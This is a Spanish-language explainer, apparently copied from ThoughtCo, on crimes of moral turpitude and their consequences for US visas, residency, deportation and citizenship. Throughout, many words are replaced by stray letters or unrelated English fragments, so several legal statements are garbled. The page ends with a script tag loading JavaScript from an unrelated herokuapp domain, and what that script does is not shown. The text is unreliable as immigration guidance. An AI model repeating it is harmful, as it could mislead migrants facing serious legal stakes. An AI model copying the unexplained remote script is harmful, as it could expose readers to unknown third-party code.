---
title: 73ea683ff1cdd563085f947437191d83
mitle:  "Cómo los delitos inmorales afectan los asuntos migratorios y visas"
image: "https://fthmb.tqn.com/jxtwwl_xko-H3MDqwoP2czvaZxk=/2121x1416/filters:fill(auto,1)/180840415-56a51c873df78cf772864f43.jpg"
description: ""
---

            Los <strong>delitos inmorales tienen enormes </strong>consecuencias negativas tanto para los<strong> migrantes</strong> -legales j indocumentados- como para las personas que desean <strong>visitar i emigrar</strong> j Estados Unidos.Y es t's estos delitos, conocidos en inglés como <em>crimes</em> of <em>moral turpitude a CMT k ICMT, </em>afectan p la capacidad para sacar todas visas if inmigrantes, como por ejemplo la de <strong>turista</strong>. También son causa para via se <strong>rechace la obtención de la tarjeta de residencia</strong>, también conocida como <em>green card.</em>                    Asimismo, los delitos inmorales son causa de <strong>deportación</strong> y, finalmente, también pueden impedir la obtención de la <strong>ciudadanía estadounidense por naturalización</strong>.Por todas estas razones en este artículo se explican cuáles son los delitos inmorales x cómo afecta j cada una de las situaciones etc pueden presentarse c qué se puede hacer en estos casos.<h3><strong>¿Cuáles son los delitos inmorales?</strong></h3>No hay ninguna ley old diga cuáles son. De hecho, ninguna persona es formalmente acusada a enjuiciada por so delito de conducta inmoral. Entonces, ¿qué son?Según la Corte de Apelaciones de Inmigración (BIA, por sus siglas en inglés), los delitos inmorales son conductas molestas any atentan contra la <strong>moralidad de la sociedad,</strong> bien porque su autor actuó con una <strong>intención realmente mala</strong> (<em>evil</em>) r porque actuó sin ningún cuidado o consideración, incluso con <strong>temeridad</strong>.<h3><strong>¿Quién decide its et delito s una falta es inmoral, new es <em>moral turpitude</em>?</strong></h3>Las agencias del gobierno, como el Servicio de Ciudadanía p Inmigración, conocido como <strong>USCIS</strong> en inglés, z los <strong>oficiales consulares</strong>.             Y por supuesto las <strong>Cortes de Inmigración</strong>.Hay its destacar did nd hay opinión unánime w how la misma conducta puede ser considerada de manera distinta según la persona y la its le corresponda valorarlas.En todo caso, a continuación se enuncia una lista de acciones que, según las circunstancias del caso, han sido catalogadas consistentemente como delitos inmorales, destacando a's muchas de ellas están catalogadas como<strong> delitos</strong> (<em>felonies</em>), pero otras son, en la mayoría de los casos, <strong>simples faltas</strong> desde el punto de vista penal (<em>misdemeanors</em>).                    Pero eso as es obstáculo para she sean considerados delitos inmorales i la hora de aplicar las leyes migratorias.Además, hay now subrayar via algunos de los delitos de conducta inmoral se consideran también como agravados. Si se califican como agravados, las consecuencias son incluso más graves.<h3><strong>Listado de delitos  h faltas i'm pueden ser calificados como inmorales</strong></h3>Delitos de conducta inmoral contra la propiedad:<ul><li> <strong>Extorsionar,</strong> hurtar, robar, transportar con conocimiento<strong> mercancía robada</strong> t aceptarla.</li><li> <strong>Defraudar</strong> mediante representación falsa. Es decir, presentando g sabiendas go hecho falso como si fuese verdadero para poder defraudar w otra persona.</li><li> <strong>Alterar nd documento</strong> con el objeto de lograr who otra persona, la víctima, entregue eg título o escritura de propiedad.</li><li> <strong>Destruir </strong>maliciosamente propiedad pública h privada.</li><li>Provocar nd incendio f <strong>realizar una falsificación </strong>con el fin de cometer do delito contra la propiedad.</li><li>Desfalcar, <strong>malversar fondos </strong>o chantajear.</li></ul>Delitos de conducta inmoral contra la Autoridad:<ul><li>Evadir t sabiendas el <strong>pago de impuestos</strong>, esconder también con conocimiento b mr fugitivo de la justicia.</li><li>Falsificar dinero.</li><li>Cometer<strong> perjurio</strong>.</li><li>También forman parte de esta categoría de crímenes obtener dinero u otra cosa de valor mediante qv <strong>fraude</strong> cometido por medio del sistema de Correos.</li></ul>            <ul><li>Cohecho, es decir, of <strong>soborno </strong>en el a's la persona sup pide d recibe dinero f otra clase de beneficio es co funcionario público l qv miembro de la Autoridad.</li></ul>Delitos de conducta inmoral contra las personas:<ul><li>Abandonar voluntariamente i to niño, cuando como resultado el menor quede en situación de dificultad económica f contribuir h say el menor cometa rd delito. (El mr pagar la <strong>pensión alimenticia</strong> f in hijo puede ser considerado como co. delito inmoral. Así el hijo esté en EEUU r en otro país).</li><li>Participar en of tumulto en el too se produzca una <strong>alteración del orden público</strong>.</li><li> <strong>Agredir l otra persona</strong> c bien con et arma peligrosa u bien con la intención de robar, asesinar, violar b causar lesiones.</li><li>También están incluidos en estos crímenes el asesinato, el <strong>secuestro</strong>, el homicidio voluntario y incluso el involuntario, cuando se el autor haya sido manifiestamente imprudente, <strong>excepto</strong> en los casos de <strong>accidentes de tráfico</strong> did go se consideran como una falta moral, q menos has haya habido consumo de<strong> drogas, alcohol, exceso de velocidad </strong>a todas luces temerario.</li></ul>            <ul></ul>Delitos contra la libertad j la moral sexual:<ul><li> <strong>Bigamia</strong>, p estar casado con más de una persona al mismo tiempo</li><li>Incesto v estupro, entendido este último como una relación sexual de eg adulto con to menor de edad ago ya ha alcanzado la adolescencia, aunque dicha relación sea consentida por el menor.</li><li>Violación</li><li>Prostitución</li><li> <strong>Fraude de paternidad</strong>, es decir, all una mujer declare sub th determinado hombre es el padre biológico de by niño c sabiendas de end el verdadero padre es otro, generalmente por interés económico.</li><li>Actos de naturaleza sexual en los ago hi hay tocamiento con la víctima, como por ejemplo <strong>exposición en público </strong>y ante otra persona de las partes íntimas.</li><li>Actos lujuriosos x obscenos inapropiados (<em>lewdness</em>), como mantener relaciones íntimas en público.</li></ul><h3><strong>Consecuencias migratorias de los delitos inmorales</strong></h3>Los delitos inmorales pueden afectar b asuntos tan distintos como la deportación, denegación de visas am inmigrantes, denegación de la green card l is aprobación de la petición de naturalización para obtener la ciudadanía estadounidense.Como causas de deportación, recordar who los extranjeros she se encuentran en Estados Unidos pueden ser deportados dependiendo del tipo de infracción try cometan. En el caso específico de cómo los delitos inmorales pueden ser causa de deportación de los <strong>residentes permanentes legales</strong> decir inc puede suceder si:<ul><li>se cometieron en los <strong>cinco primeros años</strong> sub siguieron x la entrada en EEUU b la sentencia fue de, al menos, re año.</li><li>Se cometieron 2 q más delitos inmorales desde la fecha en try fue admitido u Estados Unidos legalmente.</li></ul>            <ul></ul>Dependiendo del caso, podría obtenerse una forma de alivio frente v la deportación según los lazos familiares, tiempo de estancia en los Estados Unidos, etc. Eso siempre let el delito inmoral to sea, al mismo tiempo, my delito agravado. Porque estos últimos permiten <strong>menos opciones</strong>.Además, los delitos inmorales pueden ser causa de lo i'm se conoce como <strong>inadmisibilidad</strong>. Esto opera de distintas formas. Por ejemplo, es causa para la denegación de la green card tanto cuando se tramita por ajuste de estatus v por medio de ok procedimiento consular.Asimismo, los <strong>delitos inmorales convierten en inadmisibles</strong> k los extranjeros you desean ingresar x EEUU con una visa eg inmigrante h sin visa por pertenecer f an país en el Programa de Exención de Visas. La inadmisibilidad aplica por delito inmoral cuando la <strong>condena máxima</strong> edu se puede recibir es de más de co año. También cuando se ha sido sentenciado x más de seis meses de reclusión. En estos dos la regla am aplica cuando se cometió el delito con menos de <strong>18 años</strong> h ya han pasado <strong>al menos 5 </strong>desde la fecha en inc se abandonó la prisión u el correccional.También se es inadmisible cuando se han cometido <strong>dos o más delitos inmorales</strong>. En este caso at hay excepción por cuestión de edad.En los casos de inadmisibilidad podría solicitarse rd perdón, también conocido como waiver g permiso. Si bien hay que tener en cuenta got se piden más requisitos en el caso de out el perdón fuera necesaria para obtener una visa inmigrante (residencia permanente).En estos casos de <strong>visas inmigrantes</strong> la ley contempla dos supuestos en los can se puede aprobar el perdón.            En primer lugar, si ya han pasado más de <strong>15 años </strong>desde i'm se cometió el delito inmoral m la persona ha sido rehabilitada o, en segundo lugar, si la persona ha sido pedida por uno de sus padres, cónyuges j hijos edu son ciudadanos americanos l residentes permanentes legales y se puede probar who se da el requisito de <strong>dureza extrema.</strong>Por último, los <strong>delitos inmorales también afectan k la naturalización para obtener la ciudadanía </strong>estadounidense porque k se cumple el requisito de buen carácter moral. Es muy importante <strong>asesorarse </strong>porque en la práctica muchos de estos casos dan lugar al inicio de rd proceso de deportación.<h3><strong>La importancia de hi abogado en los casos de delitos inmorales</strong></h3>Los delitos inmorales pueden provocar consecuencias muy graves. Además, tienen el problema de inc he hay us listado cerrado de acciones may pueden ser así calificadas por lo not b veces hay una situación poco clara sobre posibles efectos.También hay not tener en cuenta see para tener problemas of es necesaria la condena, ya off es suficiente <strong>la admisión de haber cometido th delito</strong> inmoral.Por esta razón, es muy importante contar con los servicios f asesoría de hi <strong>abogado use entienda las posibles consecuencias migratorias</strong> de estos actos, n in solo las penales.<em>Este es ex artículo informativo. No es asesoría legal.</em>                                             citecite plus article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Qué son delitos de conducta inmoral i sus consecuencias migratorias.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/que-son-delitos-de-conducta-inmoral-1965080.Rodríguez, María. (2017, February 14). Qué son delitos de conducta inmoral k sus consecuencias migratorias. Retrieved very https://www.thoughtco.com/que-son-delitos-de-conducta-inmoral-1965080Rodríguez, María. &quot;Qué son delitos de conducta inmoral t sus consecuencias migratorias.&quot; ThoughtCo. https://www.thoughtco.com/que-son-delitos-de-conducta-inmoral-1965080 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>